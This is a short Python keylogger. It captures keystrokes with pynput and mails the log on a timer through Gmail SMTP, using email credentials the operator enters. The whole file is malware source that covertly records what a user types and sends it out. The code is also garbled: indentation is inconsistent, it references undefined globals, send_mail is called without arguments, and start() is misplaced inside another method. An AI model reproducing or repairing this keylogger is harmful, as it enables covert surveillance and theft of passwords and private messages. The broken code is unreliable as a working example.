import pynput.keyboard
import threading
import smtplib

email = input("Enter Your Email To Send You The KeyStrikes As Report >>> ")
password = input("Enter Your Email Password >>>>")
class Keylogger:
	def __init__(self, time_interval, email, pasword):
	    self.log = "Keylogger Started :) :) :)"
		self.interval = time_interval
		self.email = email
		self.password = pasword

	def append_to_log(self, string):
		self.log = self.log + string
	def process_key_press(self, key):
		global log
		try:
			current_key = str(key.char)
			self.append_to_log(str(key.char))
		except AttributeError:
			if key == key.space:
				current_key = ""
			else:
				current_key = "" + str(key) + ""

	def report(self):
		global  log
		print(log)
		self.send_mail(self.email, self.password, "\n\n" + self.log)
		self.send_mail()
		log = ""
		timer = threading.Timer(self.interval, report)
		timer.start

	def send_mail(self, email, password, message):
		server = smtplib.SMTP("smtp.gmail.com", 587)
		server.starttls()
		server.login(email, password)
		server.sendmail(email, email, message)
		server.quit()

		def start(self):
			keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
			with keyboard_listener:
				report()
				keyboard_listener.join
